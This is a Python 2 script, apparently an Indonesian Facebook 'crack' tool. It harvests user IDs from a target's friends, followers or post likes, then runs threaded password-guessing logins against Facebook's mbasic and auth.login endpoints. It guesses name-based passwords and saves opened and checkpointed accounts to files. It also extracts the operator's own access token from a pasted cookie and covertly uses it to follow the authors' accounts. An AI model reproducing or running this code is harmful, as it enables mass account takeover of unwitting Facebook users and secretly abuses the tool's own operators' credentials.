#!/usr/bin/python2
#-*-coding:utf-8-*-
# tertusbol oleh hakiki
# spesial thanks to khoirul syabana | NANTA XE. | kangpacman
#Created By Dapunta
#Thanks To My Teacher Who Has Perfected This Script (Angga Kurniawan & Muh Rizal Fiansyah)
#Lu Mau Recode, Mau Lu Apain Terserah Bro, Tapi Hargai Lah Karya Gua.
#Gw Bikin Ni SC Susah Payah, Ngerakit Sana Sini Banyak Error, Jgn Seenaknya Ganti Nama Author, Apalagi Ngalihin Botnya. Terima Kasih.

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
# P = '\033[0;97m'  # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

if ("linux" in sys.platform.lower()):

        N = '\033[0m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
        
def banner():
	os.system('echo -e "             ___  ___  ______  _________  ____  ___\n            / _ \/ _ \/ __/  |/  /  _/ / / /  |/  /\n           / ___/ , _/ _// /|_/ // // /_/ / /|_/ /\n          /_/  /_/|_/___/_/  /_/___/\____/_/  /_/\n           \n               Coded By : Dapunta Khurayra X\n─────────────────────────────────────────────────────────────" | lolcat')

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
ok = []
cp = []
ttl =[]

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")

def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("   [!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def log_token():
    os.system('clear')
    banner()
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        logs()
		
def gen():
        os.system("clear")
        banner()
        cookie = raw_input("\n   [•] Cookie : ")
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
                'referer'                   : 'https://m.facebook.com/',
                'host'                      : 'm.facebook.com',
                'origin'                    : 'https://m.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
                }, cookies = {
                'cookie'                    : cookie
                })
                find_token = re.search('(EAAA\w+)', data.text)
                hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print ("   [!] No Connection")
        cookie = open("login.txt", 'w')
        cookie.write(find_token.group(1))
        cookie.close()
        print("\n   [•] Login Successful")
        bot_follow()
        
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		logs()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket) #Muh Rizal Fiansyah
        requests.post('https://graph.facebook.com/100010484328037/subscribers?access_token=' + toket) #Rizal F
        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
    	menu()

def menu():
	try:
	    	toket = open('login.txt','r').read()
	    	otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	    	a = json.loads(otw.text)
	    	nama = a['name']
	    	id = a['id']
	except Exception as e:
	    	print ("   [•] Error : %s"%e)
	    	logs()
	os.system("clear")
	banner()
	print("\n   [•] Hello : "+nama)
	print("   [•] UID   : "+id)
	os.system('echo -e "\n─────────────────────────────────────────────────────────────" | lolcat')
	os.system('echo -e "\n   [ Choose Options ]" | lolcat')
	print("\n   [1] Dump ID From Public/Friend")
	print("   [2] Dump ID Followers")
	print("   [3] Dump ID Postingan")
	print("   [4] Start Crack")
	print("   [0] Logout")
	choose_menu()
	
def choose_menu():
    r=raw_input("\n   [•] Choose : ")
    if r=="":
	print("   [!] Fill In The Correct")
	menu()
    elif r=="1":
	publik()
    elif r=="2":
	follow()
    elif r=="3":
	postingan()
    elif r=="4":
	pilihcrack()
    elif r=="0":
	try:
		os.system('rm -rf login.txt')
		exit()
	except Exception as e:
		print("   [•] Error File Not Found %s"%e)
    else:
	print ("   [•] Wrong Input")
	menu()	
		
def pilihcrack():
  os.system('echo -e "\n   [ Choose Crack Methode ]" | lolcat')
  print ("\n   [1] Crack Mbasic (Low Crack)")
  print ("   [2] Crack Mbasic (Low Crack With TTL)")
  print ("   [3] Crack Api (Fast Crack)")
  print ("   [4] Crack Api (Fast Crack With TTL)")
  krah=raw_input("\n   [•] Choose : ")
  if krah in[""]:
    print("   [!] Fill In The Correct")
    pilihcrack()
  elif krah in["1","01"]:
    crack()
  elif krah in["2","02"]:
    crackttl()
  elif krah in["3","03"]:
    bapi()
  elif krah in["4","04"]:
    bapittl()
  else:
    print("   [!] Fill In The Correct")
    pilihcrack()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [•] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		logs()
	try:
                os.system("clear")
                banner()
		print("\n   [•] Type \'me\' To Dump From Friendlist")
		idt = raw_input("   [•] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("   [•] Name           : "+op["name"])
                        print("   [•] Getting ID | Please Wait ...")
		except KeyError:
			print("   [!] ID Not Found")
			print("\n   [ Back ]")
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(10000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
		ys.close()
		print("   [•] Total ID       : %s"%(len(id)))
                print("\n   [!] Copy The Output")
		print("   [•] Output         : %s"%qq)
		raw_input("\n   [ Back ]")
		menu()
		
	except Exception as e:
		exit("   [•] Error : %s"%e)

def follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [•] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		logs()
	try:
                os.system("clear")
                banner()
		idt = raw_input("\n   [•] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("   [•] Name                : "+op["name"])
                        print("   [•] Getting ID | Please Wait ...")
		except KeyError:
			print("   [!] ID Not Found")
			print("\n   [ Back ]")
			follow()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
		ys.close()
		print("   [•] Total ID            : %s"%(len(id)))
                print("\n   [!] Copy The Output")
		print("   [•] Output              : %s"%qq)
		raw_input("\n   [ Back ]")
		menu()
		
	except Exception as e:
		exit("   [•] Error : %s"%e)
		
def postingan():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m\xe2\x80\xa2 Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        idt = raw_input(" [•] ID Postingan Target : ")
        try:
            jok = requests.get('https://graph.facebook.com/'+idt+'?access_token=' + toket)
            op = json.loads(jok.text)
            qq = (op['first_name'] + '.json').replace(' ', '_')
            print("Name : "+ op['name'])
        except KeyError:
            exit(" [•] ID Not Found!")
            raw_input(" [•] Back")
            menu()

        r = requests.get('https://graph.facebook.com/'+idt+'/likes?limit=10000&access_token='+toket)
        z = json.loads(r.text)
        print(" [•] Sedang Dump...")
        print("")
        bz = open(qq, 'w')
        for a in z['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print(" [•] Total ID : %s"% len(idfromteman))
        print(" [!] Copy The Output")
        print (" [•] Output : "+qq)
        raw_input("\n [ Back ]")
        menu()
        
    except IOError:
    	print (" [!] Error")
     
	
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
	return results

def logs():
  os.system("clear")
  banner()
  print("\n   [ Choose Login Methode ]")
  print("\n   [1] Login With Token")
  print("   [2] Login With Cookie")
  print("   [3] Update Script")
  print("   [4] Report Problem")
  print("   [0] Exit")
  sek=raw_input("\n   [•] Choose : ")
  if sek=="":
    print("   [!] Fill In The Correct")
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="4":
    wangsaff()
  elif sek=="0":
    exit()
  else:
    print("   [!] Fill In The Correct")
    logs()

class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n   [•] Crack With Pass Default/Manual [d/m]")
		while True:
			f=raw_input("   [•] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("   [•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("   [•] Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("   [•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
				os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\x1b[0;37m   [•] Finished")
				results(self.ada,self.cp)
				break
	def pwlist(self):
		self.pw=raw_input("   [•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			results(self.ada,self.cp)
			print("\n\x1b[0;37m   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[0;32m   [OK] %s • %s               "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[0;33m   [CP] %s • %s               "%(fl.get("id"),i))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n   [•] Crack With Pass Default/Manual [d/m]")
		while True:
			f=raw_input("   [•] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("   [•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("   [•] Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("   [•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
				os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\x1b[0;37m   [•] Finished")
				results(self.ada,self.cp)
				break
	def pwlist(self):
		self.pw=raw_input("   [•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			results(self.ada,self.cp)
			print("\n\x1b[0;37m   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[0;32m   [OK] %s • %s               "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m   [CP] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print("\n   [•] Crack With Pass Default/Manual [d/m]")
    while True:
      f=raw_input("   [•] Choose : ")
      if f in[""," "]:
        print("   [!] Invalid Number")
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=raw_input("   [•] ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print("   [!] %s"%e)
              continue
          self.fl=[]
          print ("   [•] Example : sayang,bismillah,123456")
          self.pw=raw_input("   [•] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        results(self.ok,self.cp)
        print("\n\x1b[0;37m   [•] Finished")
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=raw_input("   [•] ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        results(self.ok,self.cp)
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if re.search('(EAAA)\\w+', response.text):
      self.ok.append(username + ' • ' + password)
      print("\r\x1b[0;32m   [OK] %s • %s %s               "%(username,password,N))
      ok.append(username + ' • ' + password)
      save = open('ok.txt', 'a')
      save.write(str(username) + ' • ' + str(password) + '\n')
      save.close()
      return True
    else:
      if 'www.facebook.com' in response.json()['error_msg']:
        self.cp.append(username + ' • ' + password)
        print("\r\x1b[0;33m   [CP] %s • %s %s               "%(username,password,N))
        save = open('cp.txt', 'a+')
        save.write(str(username) + ' • ' + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          pass
        print("\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users['id'].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          pass
        print("\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()

class bapittl:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print("\n   [•] Crack With Pass Default/Manual [d/m]")
    while True:
      f=raw_input("   [•] Choose : ")
      if f in[""," "]:
        print("   [!] Invalid Number")
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=raw_input("   [•] ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print("   [!] %s"%e)
              continue
          self.fl=[]
          print ("   [•] Example : sayang,bismillah,123456")
          self.pw=raw_input("   [•] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        results(self.ok,self.cp)
        print("\n\x1b[0;37m   [•] Finished")
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=raw_input("   [•] ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        os.system('echo -e "\n   [•] Crack Started...\n   [•] Account [OK] Saved to : ok.txt\n   [•] Account [CP] Saved to : cp.txt\n" | lolcat')
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        results(self.ok,self.cp)
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if re.search('(EAAA)\\w+', response.text):
      self.ok.append(username + ' • ' + password)
      print("\r\x1b[0;32m   [OK] %s • %s %s               "%(username,password,N))
      ok.append(username + ' • ' + password)
      save = open('ok.txt', 'a')
      save.write(str(username) + ' • ' + str(password) + '\n')
      save.close()
      return True
    else:
      if 'www.facebook.com' in response.json()['error_msg']:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + ' • ' + password + ' • ' + ttl)
        print("\r\x1b[0;33m   [CP] %s • %s • %s\x1b[0m   "%(username,password,ttl))
        save = open('cp.txt', 'a+')
        save.write(str(username) + ' • ' + str(password) + ' • '+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          pass
        print("\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users['id'].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          pass
        print("\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()
        
def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print ("\n\n   [OK] : "+str(len(Dapunta)))
        if len(Krahkrah) !=0:
                print ("\n\n   [CP] : "+str(len(Krahkrah)))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print "\n"
                print ("   [!] No Result Found")

def updatesc():
        os.system("clear")
	banner()
	print("\n   [•] Updating Script")
	os.system("git pull origin master")
        print("\n   [•] Update Successful")
	exit()

def wangsaff():
    os.system("clear")
    banner()
    raw_input("\n   [ Contact Dapunta? ]")
    jalan("   [•] Open Whatsapp...")
    os.system('xdg-open https://wa.me/+6282245780524?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20Premium%20Dapunta.%20Code:%20404')
    raw_input("\n   [ Back ]")
    logs()

if __name__=='__main__':
  menu()

